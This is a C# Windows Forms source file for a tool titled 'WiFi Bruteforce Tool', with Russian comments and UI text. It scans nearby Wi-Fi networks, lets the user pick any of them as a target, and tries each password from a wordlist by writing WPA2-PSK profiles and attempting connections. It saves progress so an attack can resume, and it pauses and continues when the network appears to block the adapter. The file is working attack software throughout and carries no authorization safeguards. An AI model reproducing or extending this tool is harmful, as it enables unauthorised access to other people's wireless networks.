using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using NativeWifi;

namespace WifiApp
{
    public partial class MainForm : Form
    {
        private WlanClient wlanClient;
        private Wlan.WlanAvailableNetwork[] networks;
        private Dictionary<string, List<int>> networkIndexMap = new Dictionary<string, List<int>>(); // SSID к индексам
        private bool isAttacking = false;
        private string selectedNetwork = "";

        // UI элементы
        private ComboBox cmbAdapters;
        private ListBox lstNetworks;
        private RadioButton rbDict;
        private TextBox txtDictPath;
        private NumericUpDown numDelay;
        private Button btnStart, btnStop, btnScan, btnBrowse, btnClear;
        private RichTextBox rtbLog;
        private Label lblStatus, lblTarget;

        // Цвета темной темы
        private Color darkBg = Color.FromArgb(31, 31, 31);
        private Color darkPanel = Color.FromArgb(45, 45, 45);
        private Color accentBlue = Color.FromArgb(66, 165, 245);
        private Color accentGreen = Color.FromArgb(76, 175, 80);
        private Color accentRed = Color.FromArgb(244, 67, 54);
        private Color accentYellow = Color.FromArgb(255, 193, 7);
        private Color accentPurple = Color.FromArgb(156, 39, 176);
        private Color textLight = Color.FromArgb(230, 230, 230);

        public MainForm()
        {
            InitializeComponent();
            this.Text = "WiFi Bruteforce Tool";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.WindowState = FormWindowState.Maximized;
            this.Icon = SystemIcons.Shield;
            this.BackColor = darkBg;
            this.Font = new Font("Segoe UI", 9);
            this.MinimumSize = new Size(600, 500);
            this.FormBorderStyle = FormBorderStyle.Sizable;

            InitializeComponents();
            this.Load += (s, e) => LoadAdapters();
        }

        private void InitializeComponent()
        {
            // Для дизайнера
        }

        private void InitializeComponents()
        {
            // Верхняя панель
            var headerPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 60,
                BackColor = accentBlue,
                Padding = new Padding(15)
            };

            var headerLabel = new Label
            {
                Text = "WiFi BRUTEFORCE TOOL",
                Font = new Font("Segoe UI", 16, FontStyle.Bold),
                ForeColor = Color.White,
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleLeft
            };
            headerPanel.Controls.Add(headerLabel);

            // Главный контейнер
            var mainContainer = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = darkBg,
                Padding = new Padding(10)
            };

            // Левая панель управления
            var leftPanel = new Panel
            {
                Dock = DockStyle.Left,
                Width = 450,
                BackColor = darkBg,
                AutoScroll = true,
                Padding = new Padding(0, 0, 10, 0)
            };

            int y = 10;

            // Адаптер
            var lbl1 = new Label { Text = "АДАПТЕР", Location = new Point(10, y), AutoSize = true, Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = accentBlue, BackColor = darkBg };
            leftPanel.Controls.Add(lbl1);
            y += 25;

            cmbAdapters = new ComboBox { Location = new Point(10, y), Width = 280, Height = 26, DropDownStyle = ComboBoxStyle.DropDownList, Font = new Font("Segoe UI", 9), BackColor = darkPanel, ForeColor = textLight };
            cmbAdapters.SelectedIndexChanged += CmbAdapters_SelectedIndexChanged;
            leftPanel.Controls.Add(cmbAdapters);

            btnScan = new Button { Location = new Point(300, y), Width = 130, Height = 26, Text = "СКАНИРОВАТЬ", Font = new Font("Segoe UI", 9, FontStyle.Bold), BackColor = accentBlue, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            btnScan.FlatAppearance.BorderSize = 0;
            btnScan.Click += BtnScan_Click;
            leftPanel.Controls.Add(btnScan);
            y += 40;

            // Доступные сети
            var lbl2 = new Label { Text = "ДОСТУПНЫЕ СЕТИ", Location = new Point(10, y), AutoSize = true, Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = accentGreen, BackColor = darkBg };
            leftPanel.Controls.Add(lbl2);
            y += 25;

            lstNetworks = new ListBox { Location = new Point(10, y), Width = 410, Height = 80, Font = new Font("Consolas", 8), BackColor = darkPanel, ForeColor = accentGreen, SelectionMode = SelectionMode.One, BorderStyle = BorderStyle.FixedSingle };
            lstNetworks.SelectedIndexChanged += LstNetworks_SelectedIndexChanged;
            leftPanel.Controls.Add(lstNetworks);
            y += 95;

            // Целевая сеть
            var lbl3 = new Label { Text = "ЦЕЛЕВАЯ СЕТЬ", Location = new Point(10, y), AutoSize = true, Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = accentYellow, BackColor = darkBg };
            leftPanel.Controls.Add(lbl3);
            y += 25;

            lblTarget = new Label { Location = new Point(10, y), Width = 410, Height = 28, Text = "Не выбрана", ForeColor = accentYellow, BackColor = darkPanel, Font = new Font("Segoe UI", 9, FontStyle.Bold), BorderStyle = BorderStyle.FixedSingle, TextAlign = ContentAlignment.MiddleLeft, Padding = new Padding(5) };
            leftPanel.Controls.Add(lblTarget);
            y += 40;

            // Способ атаки
            var lbl4 = new Label { Text = "СПОСОБ АТАКИ", Location = new Point(10, y), AutoSize = true, Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = accentRed, BackColor = darkBg };
            leftPanel.Controls.Add(lbl4);
            y += 25;

            rbDict = new RadioButton { Text = "Загрузить из файла", Location = new Point(10, y), AutoSize = true, ForeColor = textLight, BackColor = darkBg, Checked = true, Font = new Font("Segoe UI", 9) };
            leftPanel.Controls.Add(rbDict);
            y += 28;

            var lbl5 = new Label { Text = "Путь к словарю:", Location = new Point(10, y), AutoSize = true, ForeColor = accentBlue, BackColor = darkBg, Font = new Font("Segoe UI", 9) };
            leftPanel.Controls.Add(lbl5);
            y += 22;

            txtDictPath = new TextBox { Location = new Point(10, y), Width = 350, Height = 24, BackColor = Color.FromArgb(60, 60, 60), ForeColor = textLight, Font = new Font("Segoe UI", 9), BorderStyle = BorderStyle.FixedSingle };
            leftPanel.Controls.Add(txtDictPath);

            btnBrowse = new Button { Location = new Point(365, y), Width = 55, Height = 24, Text = "...", Font = new Font("Segoe UI", 9, FontStyle.Bold), BackColor = Color.FromArgb(103, 58, 183), ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            btnBrowse.FlatAppearance.BorderSize = 0;
            btnBrowse.Click += BtnBrowse_Click;
            leftPanel.Controls.Add(btnBrowse);
            y += 38;

            // Задержка
            var lbl6 = new Label { Text = "ЗАДЕРЖКА (МС)", Location = new Point(10, y), AutoSize = true, Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = accentPurple, BackColor = darkBg };
            leftPanel.Controls.Add(lbl6);
            y += 25;

            numDelay = new NumericUpDown { Location = new Point(10, y), Width = 80, Height = 24, Minimum = 100, Maximum = 10000, Value = 7000, BackColor = Color.FromArgb(60, 60, 60), ForeColor = textLight, Font = new Font("Segoe UI", 9) };
            leftPanel.Controls.Add(numDelay);
            y += 38;

            // Кнопки
            btnStart = new Button { Location = new Point(10, y), Width = 130, Height = 32, Text = "ЗАПУСТИТЬ", Font = new Font("Segoe UI", 9, FontStyle.Bold), BackColor = accentGreen, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            btnStart.FlatAppearance.BorderSize = 0;
            btnStart.Click += BtnStart_Click;
            leftPanel.Controls.Add(btnStart);

            btnStop = new Button { Location = new Point(150, y), Width = 120, Height = 32, Text = "ОСТАНОВИТЬ", Font = new Font("Segoe UI", 9, FontStyle.Bold), BackColor = accentRed, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Enabled = false };
            btnStop.FlatAppearance.BorderSize = 0;
            btnStop.Click += BtnStop_Click;
            leftPanel.Controls.Add(btnStop);

            btnClear = new Button { Location = new Point(280, y), Width = 140, Height = 32, Text = "ОЧИСТИТЬ ЛОГ", Font = new Font("Segoe UI", 9, FontStyle.Bold), BackColor = Color.FromArgb(158, 158, 158), ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            btnClear.FlatAppearance.BorderSize = 0;
            btnClear.Click += BtnClear_Click;
            leftPanel.Controls.Add(btnClear);
            y += 45;

            // Статус
            lblStatus = new Label { Location = new Point(10, y), Width = 410, Height = 24, Text = "Готово", BackColor = darkPanel, ForeColor = accentGreen, Font = new Font("Segoe UI", 8, FontStyle.Bold), TextAlign = ContentAlignment.MiddleLeft, Padding = new Padding(5), BorderStyle = BorderStyle.FixedSingle };
            leftPanel.Controls.Add(lblStatus);

            // Правая панель логирования
            var rightPanel = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = darkBg,
                Padding = new Padding(10, 0, 0, 0)
            };

            var logHeaderLabel = new Label
            {
                Text = "ЛОГ ПОПЫТОК",
                Location = new Point(10, 10),
                AutoSize = true,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                ForeColor = accentGreen,
                BackColor = darkBg
            };
            rightPanel.Controls.Add(logHeaderLabel);

            rtbLog = new RichTextBox
            {
                Location = new Point(10, 40),
                Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right,
                ReadOnly = true,
                Font = new Font("Consolas", 8),
                BackColor = Color.FromArgb(20, 20, 20),
                ForeColor = accentGreen,
                WordWrap = true,
                BorderStyle = BorderStyle.FixedSingle
            };
            rtbLog.Width = rightPanel.Width - 20;
            rtbLog.Height = rightPanel.Height - 50;
            rightPanel.Controls.Add(rtbLog);

            mainContainer.Controls.Add(rightPanel);
            mainContainer.Controls.Add(leftPanel);

            this.Controls.Add(mainContainer);
            this.Controls.Add(headerPanel);
        }

        private void LoadAdapters()
        {
            try
            {
                wlanClient = new WlanClient();
                cmbAdapters.Items.Clear();

                if (wlanClient.Interfaces.Length == 0)
                {
                    Log("Адаптеры не найдены", accentRed);
                    lblStatus.Text = "Ошибка: адаптеры не найдены";
                    return;
                }

                foreach (var adapter in wlanClient.Interfaces)
                {
                    cmbAdapters.Items.Add(adapter.InterfaceName);
                }

                cmbAdapters.SelectedIndex = 0;
                Log($"{wlanClient.Interfaces.Length} адаптеров", accentGreen);

                FindDictionary();
                Task.Run(() => AutoScanNetworks());

                lblStatus.Text = "Готово";
            }
            catch (Exception ex)
            {
                Log($"ОШИБКА: {ex.Message}", accentRed);
                lblStatus.Text = "ОШИБКА";
            }
        }

        private async void AutoScanNetworks()
        {
            try
            {
                if (wlanClient == null || wlanClient.Interfaces.Length == 0)
                    return;

                var adapter = wlanClient.Interfaces[0];
                adapter.Scan();
                await Task.Delay(1500); // Ждём результатов

                networks = adapter.GetAvailableNetworkList(0);

                this.Invoke(new Action(() =>
                {
                    lstNetworks.Items.Clear();
                    networkIndexMap.Clear();

                    if (networks.Length == 0)
                    {
                        Log("Доступные сети не найдены", accentYellow);
                        return;
                    }

                    // Группировка по SSID
                    Dictionary<string, List<int>> ssidMap = new Dictionary<string, List<int>>();
                    for (int i = 0; i < networks.Length; i++)
                    {
                        string ssid = GetStringForSSID(networks[i].dot11Ssid);
                        if (!ssidMap.ContainsKey(ssid))
                            ssidMap[ssid] = new List<int>();
                        ssidMap[ssid].Add(i);
                    }

                    Log($"Автосканирование: найдено {networks.Length} сетей ({ssidMap.Count} уникальных)\n", accentGreen);

                    int displayIndex = 0;
                    foreach (var kvp in ssidMap)
                    {
                        string ssid = kvp.Key;
                        List<int> indices = kvp.Value;
                        int signal = (int)networks[indices[0]].wlanSignalQuality;
                        string protocol = GetProtocolName(networks[indices[0]].dot11DefaultAuthAlgorithm);

                        string bands = indices.Count > 1 ? " [Двухдиапазонная]" : "";
                        string info = $"[{displayIndex}] {ssid}{bands}";
                        lstNetworks.Items.Add(info);
                        networkIndexMap[info] = indices;
                        Log($"  {ssid}{bands} - {protocol} ({signal}% сигнал)", accentGreen);

                        displayIndex++;
                    }

                    lblStatus.Text = $"{networks.Length} сетей ({ssidMap.Count} уникальных)";
                }));
            }
            catch (Exception ex)
            {
                this.Invoke(new Action(() =>
                {
                    Log($"Ошибка при автосканировании: {ex.Message}", accentYellow);
                }));
            }
        }

        private string GetProjectRootDirectory()
        {
            // Поиск корня проекта
            string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string exeDir = Path.GetDirectoryName(exePath);

            // Идём вверх до WifiApp.csproj
            string currentDir = exeDir;
            for (int i = 0; i < 5; i++)
            {
                if (File.Exists(Path.Combine(currentDir, "WifiApp.csproj")))
                {
                    return currentDir;
                }
                currentDir = Path.GetDirectoryName(currentDir);
                if (currentDir == null) break;
            }

            return exeDir;
        }

        private string GetProgressDirectory()
        {
            string rootDir = GetProjectRootDirectory();
            string progressDir = Path.Combine(rootDir, "progress");

            // Создаём папку progress
            if (!Directory.Exists(progressDir))
            {
                Directory.CreateDirectory(progressDir);
            }

            return progressDir;
        }

        private void FindDictionary()
        {
            try
            {
                // Ищем папку dictionaries
                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                string exeDir = Path.GetDirectoryName(exePath);
                string dictionariesPath = Path.Combine(exeDir, "dictionaries");

                // Пробуем вверх
                if (!Directory.Exists(dictionariesPath))
                {
                    dictionariesPath = Path.Combine(exeDir, "..", "..", "..", "..", "dictionaries");
                    dictionariesPath = Path.GetFullPath(dictionariesPath);
                }

                // Пробуем базовую директорию
                if (!Directory.Exists(dictionariesPath))
                {
                    dictionariesPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dictionaries");
                }

                if (Directory.Exists(dictionariesPath))
                {
                    var files = Directory.GetFiles(dictionariesPath, "*.txt");

                    if (files.Length > 0)
                    {
                        string dictionaryPath = files[0];
                        txtDictPath.Text = dictionaryPath;
                        Log($"Словарь найден: {Path.GetFileName(dictionaryPath)}", accentGreen);
                        return;
                    }
                }

                Log("Словарь не найден в папке dictionaries", accentYellow);
            }
            catch (Exception ex)
            {
                Log($"Ошибка при поиске словаря: {ex.Message}", accentYellow);
            }
        }

        private void Log(string message, Color color)
        {
            if (rtbLog.InvokeRequired)
            {
                rtbLog.Invoke(new Action(() => Log(message, color)));
                return;
            }

            rtbLog.SelectionStart = rtbLog.Text.Length;
            rtbLog.SelectionColor = color;
            rtbLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}\n");
            rtbLog.SelectionStart = rtbLog.Text.Length;
            rtbLog.ScrollToCaret();
        }

        private void CmbAdapters_SelectedIndexChanged(object sender, EventArgs e)
        {
            lstNetworks.Items.Clear();
            lblTarget.Text = "Не выбрана";
        }

        private void BtnScan_Click(object sender, EventArgs e)
        {
            if (cmbAdapters.SelectedIndex < 0) return;

            // Сканирование в фоне
            Task.Run(async () => await ScanNetworksAsync());
        }

        private async Task ScanNetworksAsync()
        {
            try
            {
                this.Invoke(new Action(() =>
                {
                    lblStatus.Text = "Сканирование...";
                    Log("================================", accentBlue);
                    Log("Сканирование сетей...", accentYellow);
                }));

                var adapter = wlanClient.Interfaces[cmbAdapters.SelectedIndex];
                adapter.Scan();
                await Task.Delay(1000);

                networks = adapter.GetAvailableNetworkList(0);

                this.Invoke(new Action(() =>
                {
                    lstNetworks.Items.Clear();
                    networkIndexMap.Clear();

                    if (networks.Length == 0)
                    {
                        Log("Сети не найдены", accentRed);
                        return;
                    }

                    // Группировка по SSID
                    Dictionary<string, List<int>> ssidMap = new Dictionary<string, List<int>>();
                    for (int i = 0; i < networks.Length; i++)
                    {
                        string ssid = GetStringForSSID(networks[i].dot11Ssid);
                        if (!ssidMap.ContainsKey(ssid))
                            ssidMap[ssid] = new List<int>();
                        ssidMap[ssid].Add(i);
                    }

                    Log($"Найдено {networks.Length} сетей ({ssidMap.Count} уникальных)\n", accentGreen);

                    int displayIndex = 0;
                    foreach (var kvp in ssidMap)
                    {
                        string ssid = kvp.Key;
                        List<int> indices = kvp.Value;
                        int firstIndex = indices[0];

                        string protocol = GetProtocolName(networks[firstIndex].dot11DefaultAuthAlgorithm);
                        string cipher = networks[firstIndex].dot11DefaultCipherAlgorithm.ToString();
                        int signal = (int)networks[firstIndex].wlanSignalQuality;

                        // Несколько диапазонов
                         string bands = "";
                         if (indices.Count > 1)
                         {
                             var frequencies = new List<string>();
                             foreach (int idx in indices)
                             {
                                 // Диапазон по каналу
                                 frequencies.Add("2.4ГГц/5ГГц");
                             }
                             bands = " [Двухдиапазонная]";
                         }

                        string info = $"[{displayIndex}] {ssid}{bands}";
                        lstNetworks.Items.Add(info);
                        networkIndexMap[info] = indices;

                        Log($"  SSID: {ssid}{bands}", accentGreen);
                        Log($"    Протокол: {protocol} | Шифр: {cipher}", accentBlue);
                        Log($"    Сигнал: {signal}%", accentYellow);

                        displayIndex++;
                    }

                    Log("================================\n", accentBlue);
                    lblStatus.Text = $"{networks.Length} сетей ({ssidMap.Count} уникальных)";
                }));
            }
            catch (Exception ex)
            {
                this.Invoke(new Action(() =>
                {
                    Log($"❌ {ex.Message}", accentRed);
                }));
            }
        }

        private void LstNetworks_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (lstNetworks.SelectedIndex >= 0)
            {
                string selectedItem = (string)lstNetworks.Items[lstNetworks.SelectedIndex];

                // Индексы сетей выбранного SSID
                if (networkIndexMap.ContainsKey(selectedItem))
                {
                    List<int> indices = networkIndexMap[selectedItem];
                    int networkIndex = indices[0]; // Первая сеть

                    selectedNetwork = GetStringForSSID(networks[networkIndex].dot11Ssid);
                    string protocol = GetProtocolName(networks[networkIndex].dot11DefaultAuthAlgorithm);
                    string cipher = networks[networkIndex].dot11DefaultCipherAlgorithm.ToString();
                    int signal = (int)networks[networkIndex].wlanSignalQuality;

                    string bandInfo = indices.Count > 1 ? " [Двухдиапазонная]" : "";
                    lblTarget.Text = $"► {selectedNetwork}{bandInfo} ({protocol} | {signal}%)";
                }
            }
        }

        private void BtnBrowse_Click(object sender, EventArgs e)
        {
            using (var dialog = new OpenFileDialog { Filter = "*.txt|*.txt|*.*|*.*" })
            {
                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    txtDictPath.Text = dialog.FileName;
                }
            }
        }

        private void BtnStart_Click(object sender, EventArgs e)
        {
            if (cmbAdapters.SelectedIndex < 0)
            {
                MessageBox.Show("Выберите адаптер");
                return;
            }

            if (lstNetworks.SelectedIndex < 0)
            {
                MessageBox.Show("Выберите сеть");
                return;
            }

            if (rbDict.Checked && !File.Exists(txtDictPath.Text))
            {
                MessageBox.Show("Выберите файл словаря");
                return;
            }

            string method = "Словарь";

            var confirmResult = MessageBox.Show(
                $"Сеть: {selectedNetwork}\nМетод: {method}\n\nПродолжить?",
                "ПОДТВЕРЖДЕНИЕ",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Question);

            if (confirmResult != DialogResult.Yes)
                return;

            btnStart.Enabled = false;
            btnStop.Enabled = true;

            var adapter = wlanClient.Interfaces[cmbAdapters.SelectedIndex];

            // Индекс выбранной сети
            string selectedItem = (string)lstNetworks.Items[lstNetworks.SelectedIndex];
            List<int> indices = networkIndexMap[selectedItem];
            int networkIndex = indices[0]; // Первая сеть
            var network = networks[networkIndex];
            int delay = (int)numDelay.Value;

            lblStatus.Text = "⚔ АТАКА...";
            Log($"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", accentRed);
            Log($"🎯 ЦЕЛЬ: {selectedNetwork}", accentRed);
            Log($"⚔️  МЕТОД: {method}", accentRed);
            Log($"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n", accentRed);

            Task.Run(async () =>
            {
                try
                {
                    var passwords = File.ReadAllLines(txtDictPath.Text).ToList();
                    await BruteforceListAsync(adapter, network, passwords, delay);
                }
                catch (Exception ex)
                {
                    Log($"❌ {ex.Message}", accentRed);
                }
                finally
                {
                    btnStart.Invoke(new Action(() => btnStart.Enabled = true));
                    btnStop.Invoke(new Action(() => btnStop.Enabled = false));
                    lblStatus.Invoke(new Action(() => lblStatus.Text = "⚡ Готово"));
                }
            });
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            isAttacking = false;
            Log("ОСТАНОВЛЕНО", accentYellow);
            lblStatus.Text = "Готово";
        }

        private void BtnClear_Click(object sender, EventArgs e)
        {
            rtbLog.Clear();
        }

        private string GetStringForSSID(Wlan.Dot11Ssid ssid)
        {
            return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
        }

        private string GetHexForSSID(string ssid)
        {
            byte[] hexBytes = Encoding.Default.GetBytes(ssid);
            return BitConverter.ToString(hexBytes).Replace("-", "");
        }

        private string GetProtocolName(Wlan.Dot11AuthAlgorithm authAlgorithm)
        {
            // Все возможные протоколы Wi-Fi безопасности:
            // 🔓 Open - открытая сеть (без пароля)
            // 🔐 WEP - устарелый (1997), небезопасный
            // 🔐 WPA / WPA-PSK - старый (2003)
            // 🔐 WPA2 / WPA2-PSK - текущий стандарт (2004)
            // 🔐 WPA3 / WPA3-PSK - новый стандарт (2018)
            // 🔐 802.1X - корпоративная аутентификация

            return authAlgorithm switch
            {
                // Открытая сеть
                Wlan.Dot11AuthAlgorithm.IEEE80211_Open => "🔓 Open",

                // WEP
                Wlan.Dot11AuthAlgorithm.IEEE80211_SharedKey => "🔐 WEP",

                // WPA (2003, устарелый)
                Wlan.Dot11AuthAlgorithm.WPA => "🔐 WPA (802.1X)",
                Wlan.Dot11AuthAlgorithm.WPA_PSK => "🔐 WPA-PSK",
                Wlan.Dot11AuthAlgorithm.WPA_None => "⚠️ WPA-None",

                // RSNA/WPA2 (2004, текущий стандарт) или WPA3 (2018, новый)
                // Note: Старый API не различает WPA2 и WPA3 напрямую
                Wlan.Dot11AuthAlgorithm.RSNA => "🔐 WPA2/WPA3 (802.1X)",
                Wlan.Dot11AuthAlgorithm.RSNA_PSK => "🔐 WPA2-PSK / WPA3-PSK",

                // Неизвестный протокол
                _ => "❓ Неизвестный"
            };
        }

        private string CreateProfileXml(string profileName, string hex, string key)
        {
            return string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><hex>{1}</hex><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>manual</connectionMode><autoSwitch>false</autoSwitch><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{2}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>", profileName, hex, key);
        }

        private async Task BruteforceListAsync(WlanClient.WlanInterface adapter, Wlan.WlanAvailableNetwork network, List<string> passwords, int delay)
        {
            string ssid = GetStringForSSID(network.dot11Ssid);
            string hex = GetHexForSSID(ssid);

            // Имя файла прогресса
            string safeSSID = new string(ssid.Where(c => char.IsLetterOrDigit(c) || c == '_').ToArray());

            // Папка progress
            string progressDir = GetProgressDirectory();
            string progressFile = Path.Combine(progressDir, $"progress_{safeSSID}.txt");

            int startIndex = 0;
            if (File.Exists(progressFile))
            {
                try
                {
                    string lastLine = File.ReadLines(progressFile).LastOrDefault();
                    if (!string.IsNullOrEmpty(lastLine) && int.TryParse(lastLine, out int lastAttempt))
                    {
                        startIndex = lastAttempt;
                        Log($"Продолжаем с попытки {startIndex}...", accentBlue);
                    }
                }
                catch { }
            }

            Log($"Загружено {passwords.Count} паролей\n", accentBlue);

            isAttacking = true;
            int attempt = 0;
            int consecutiveTimeouts = 0;
            const int TIMEOUT_THRESHOLD = 3; // Обнаружение блокировки

            foreach (string password in passwords)
            {
                if (!isAttacking) break;
                attempt++;

                // Уже проверённые пароли
                if (attempt <= startIndex)
                    continue;

                // Пароли короче 8 символов
                if (password.Length < 8)
                {
                    Log($"Пропуск: {password} (< 8 символов)", accentBlue);
                    File.WriteAllText(progressFile, attempt.ToString());
                    continue;
                }

                // Логируем попытку
                Log($"Попытка {attempt}/{passwords.Count}: {password}", accentYellow);

                string xml = CreateProfileXml(ssid, hex, password);

                try
                {
                    // Проверка адаптера
                    try
                    {
                        var currentNet = adapter.CurrentConnection;
                        if (currentNet.isState == Wlan.WlanInterfaceState.Connected)
                        {
                            await Task.Delay(1000); // Отключение
                        }
                    }
                    catch { }

                    // Создание профиля
                    try
                    {
                        adapter.SetProfile(Wlan.WlanProfileFlags.AllUser, xml, true);
                    }
                    catch
                    {
                        Log($"Попытка {attempt}/{passwords.Count}: {password} - Ошибка профиля", accentYellow);
                        string errorLog = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Попытка {attempt}: {password} - Ошибка профиля\n";
                        File.AppendAllText(progressFile, errorLog);
                        await Task.Delay(1000);
                        File.WriteAllText(progressFile, attempt.ToString());
                        continue;
                    }

                    // Обработка профиля
                    await Task.Delay(500);

                    // Подключение с таймаутом
                    Log($"   Ожидание ответа ({delay}мс)...", accentYellow);
                    var connectionResult = adapter.ConnectSynchronouslyWithReason(
                        Wlan.WlanConnectionMode.Profile,
                        Wlan.Dot11BssType.Any,
                        ssid,
                        delay);

                    // Результат подключения
                    if (connectionResult.Success)
                    {
                        // Успешное подключение
                        Log($"УСПЕХ! Пароль: {password}", accentGreen);
                        consecutiveTimeouts = 0;

                        string securityType = GetProtocolName(network.dot11DefaultAuthAlgorithm);
                        StringBuilder successLog = new StringBuilder();
                        successLog.AppendLine("===============================================");
                        successLog.AppendLine($"УСПЕШНОЕ ПОДКЛЮЧЕНИЕ - СЛОВАРЬ");
                        successLog.AppendLine("===============================================");
                        successLog.AppendLine($"Дата и время: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                        successLog.AppendLine($"Целевая сеть (SSID): {ssid}");
                        successLog.AppendLine($"Тип безопасности: {securityType}");
                        successLog.AppendLine($"Номер попытки: {attempt}");
                        successLog.AppendLine($"Найденный пароль: {password}");
                        successLog.AppendLine($"Адаптер: {wlanClient.Interfaces[cmbAdapters.SelectedIndex].InterfaceName}");
                        successLog.AppendLine($"Таймаут попытки: {delay}мс");
                        successLog.AppendLine("===============================================");
                        File.AppendAllText(progressFile, successLog.ToString());
                        return;
                    }
                    else
                    {
                        // Ошибка подключения
                        string reasonMsg = connectionResult.ReasonMessage;

                        // Обнаружение блокировки
                        if (reasonMsg.Contains("timeout") || reasonMsg.Contains("Тайм") ||
                            reasonMsg.Contains("недоступ") || reasonMsg.Contains("отсутст"))
                        {
                            consecutiveTimeouts++;
                            Log($"ТАЙМАУТ {consecutiveTimeouts}/{TIMEOUT_THRESHOLD} - {password}", accentRed);

                            // Много таймаутов
                            if (consecutiveTimeouts >= TIMEOUT_THRESHOLD)
                            {
                                Log($"ВНИМАНИЕ! Сеть возможно ЗАБАНИЛА этот адаптер", accentRed);
                                Log($"Пауза на 30 секунд перед продолжением...", accentYellow);
                                await Task.Delay(30000); // 30 сек
                                consecutiveTimeouts = 0;
                            }
                        }
                        else
                        {
                            // Ошибка аутентификации
                            consecutiveTimeouts = 0;
                            Log($"ОШИБКА: {password} - {reasonMsg}", accentRed);
                        }

                        // Сохраняем ошибку
                        string errorLog = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] Попытка {attempt}: {password} - {reasonMsg}\n";
                        File.AppendAllText(progressFile, errorLog);
                    }

                    // Пауза перед следующей
                    await Task.Delay(1000);
                }
                catch (Exception ex)
                {
                    consecutiveTimeouts++;
                    string errorMsg = ex.Message.Length > 60 ? ex.Message.Substring(0, 60) : ex.Message;
                    Log($"ИСКЛЮЧЕНИЕ: {password} - {errorMsg}", accentYellow);

                    // Ошибок подряд
                    if (consecutiveTimeouts >= TIMEOUT_THRESHOLD)
                    {
                        Log($"ВНИМАНИЕ! Сеть возможно ЗАБАНИЛА этот адаптер", accentRed);
                        Log($"Пауза на 30 секунд перед продолжением...", accentYellow);
                        await Task.Delay(30000);
                        consecutiveTimeouts = 0;
                    }

                    await Task.Delay(1000);
                }

                // Сохраняем прогресс
                File.WriteAllText(progressFile, attempt.ToString());

                // Статистика
                if (attempt % 10 == 0 && attempt > startIndex)
                {
                    int remaining = passwords.Count - attempt;
                    Log($"Прогресс: {attempt}/{passwords.Count} | Осталось: {remaining}", accentBlue);
                }
            }

            Log("Перебор завершён - пароль не найден", accentRed);
        }
    }
}
